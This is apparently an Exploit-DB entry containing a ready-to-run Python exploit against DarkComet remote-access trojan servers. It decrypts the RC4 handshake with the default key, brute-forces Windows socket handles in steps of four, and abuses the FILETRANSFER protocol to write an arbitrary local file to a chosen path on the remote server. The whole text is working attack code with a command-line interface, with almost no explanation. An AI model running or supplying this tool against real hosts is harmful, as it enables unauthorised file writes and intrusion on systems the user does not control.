#
# EDB Note: Source ~ https://gist.github.com/PseudoLaboratories/260b6f24844785aacc1e2fb61dd05c01/259944bd94a0d289ef80b9138c1e3f97a97aa9cd
#
 
from time import sleep
from socket import socket, AF_INET, SOCK_STREAM, error
from re import search
from Crypto.Cipher import ARC4
from binascii import hexlify, unhexlify
 
import argparse
 
def good(text):
    print(&#039;[+] &#039; + text)
 
def bad(text):
    print(&#039;[-] &#039; + text)
 
def normal(text):
    print(&#039;[*] &#039; + text)
 
def decrypt(data, key):
    return ARC4.new(key).decrypt(unhexlify(data)).upper()
 
def encrypt(data, key):
    return hexlify(ARC4.new(key).encrypt(data)).upper()
 
def upload(domain, port, key, local, remote, test):
    remote = remote.replace(&#039;\\&#039;, &#039;/&#039;)
    f = open(local, "rb")
    client = socket(AF_INET, SOCK_STREAM)
    client.settimeout(5.0)
    client.connect((domain, port))
    try:
        idtype = decrypt(client.recv(12), key)
        if idtype != b&#039;IDTYPE&#039;:
            bad(&#039;Key seems to be wrong!&#039;)
            return
 
        filetransfer = encrypt(&#039;FILETRANSFER111|%s&#039; % test, key)
        client.send(filetransfer)
        client.recv(3)
        client.send(b&#039;FILEBOF&#039; + remote.encode(&#039;utf-8&#039;) + b&#039;|111&#039;)
        client.recv(1)
        content = f.read()
        current = 0
        while (current + 1024) < len(content):
            current += client.send(content[current:current+1024])
            client.recv(1)
        client.send(content[current:len(content)])
        client.recv(1)
        client.send(b&#039;FILEEOF&#039;)
        client.recv(1)
        client.send(b&#039;FILEEND&#039;)
        client.close()
        return True
    except error as e:
        client.close()
    return False
 
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description=&#039;bruteforce socket handle and upload arbitrary files to DarkComet servers&#039;)
    parser.add_argument(&#039;--port&#039;, &#039;-p&#039;, dest=&#039;port&#039;, type=int, default=1604, help=&#039;port of the DarkComet server&#039;)
    parser.add_argument(&#039;--key&#039;, &#039;-k&#039;, dest=&#039;key&#039;, default=&#039;#KCMDDC51#-890&#039;, help=&#039;password of the DarkComet server&#039;)
    parser.add_argument(&#039;--start&#039;, &#039;-s&#039;, dest=&#039;start&#039;, type=int, default=0)
    parser.add_argument(&#039;--end&#039;, &#039;-e&#039;, dest=&#039;end&#039;, type=int, default=2400)
 
    parser.add_argument(&#039;domain&#039;, help=&#039;domain name/ip of the DarkComet server&#039;)
    parser.add_argument(&#039;local&#039;, help=&#039;file name of the local file&#039;)
    parser.add_argument(&#039;remote&#039;, help=&#039;remote relative file path&#039;)
 
    args = parser.parse_args()
 
    for i in range(args.start, args.end, 4):
        # Increment by 4 because Windows seems to only
        # generate socket handles that are multiples of 4
        normal(&#039;Trying &#039; + str(i))
        if upload(args.domain, args.port, args.key, args.local, args.remote, i):
            good(&#039;Uploaded successfully!&#039;)
            break
        sleep(2)

